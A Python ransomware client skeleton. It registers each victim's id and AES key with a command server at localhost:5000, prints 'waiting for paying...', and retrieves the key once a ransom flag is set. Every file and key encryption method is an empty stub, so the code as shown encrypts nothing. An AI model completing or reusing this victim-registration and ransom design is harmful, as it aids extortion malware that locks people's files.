import os
import uuid
import json
import requests

CUR_PATH = os.path.dirname(__file__)

with open(CUR_PATH + '/pubkey', 'r') as f:
    PUB_KEY = f.read()
ADD_URL = 'http://localhost:5000/victims/add'
GET_URL = 'http://localhost:5000/victims/'
HEADER = {
        "content-type": "application/json"
    }


class Client():
    def __init__(self):
        self.id = uuid.uuid1().hex
        self.aes_key = self.gen_key()
        self.init_virus()
    
    def init_virus(self):
        print('initializing...')
        data = {
            'id': self.id,
            'aes_key': self.aes_key,
            'ransom': False
        }
        self.post_server(data, ADD_URL)
        self.enc_file()
        self.enc_key()
        print('waiting for paying...')
    
    def gen_key(self):
        print('generating key...')
        return None

    def enc_key(self):
        print('encryptint key...')
        pass

    def dec_key(self):
        print('decrypting key...')
        pass

    def enc_file(self):
        print('encrypting file...')
        pass

    def dec_file(self):
        print('decrypting file...')
        pass

    def get_key(self):
        data = {
            'id': self.id,
            'aes_key': self.aes_key,
            'ransom': True
        }        
        res = self.post_server(data, GET_URL + self.id)
        self.aes_key = res['aes_key']
        print('get aes_key success')

    @staticmethod
    def post_server(data, url):
        payload = json.dumps(data)
        r = requests.post(url, payload, headers=HEADER)
        return r.json()

if __name__ == "__main__":
    client = Client()
    # data = {
    #         'id': uuid.uuid1().hex
    #     }
    # r = Client.post_server(data)
    # print(r)
    # print(r.json())
    # post_data = {"id": "mkf", "aes_key": "456", "ransom": True}
    # client.post_server(post_data)
    # client.put(post_data)